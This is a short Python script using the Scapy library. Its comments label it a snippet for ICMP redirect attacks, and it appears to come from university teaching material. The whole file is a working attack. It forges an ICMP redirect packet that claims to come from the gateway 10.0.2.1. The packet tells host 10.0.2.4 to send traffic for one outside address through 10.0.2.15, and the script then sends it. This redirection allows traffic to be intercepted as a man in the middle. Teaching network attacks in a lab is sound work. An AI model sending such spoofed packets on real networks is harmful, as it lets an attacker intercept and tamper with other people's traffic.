# All-by-Pythonself
# Snippet for ICMP redirect attacks
# by Hae Young Lee
# at Cheongju University

from scapy . all import *

p = IP (src = "10.0.2.1", dst = "10.0.2.4") / ICMP (type = 5, code = 1, gw = "10.0.2.15") / IP (src = "10.0.2.4", dst = "211.42.85.240") / UDP ()
send (p)
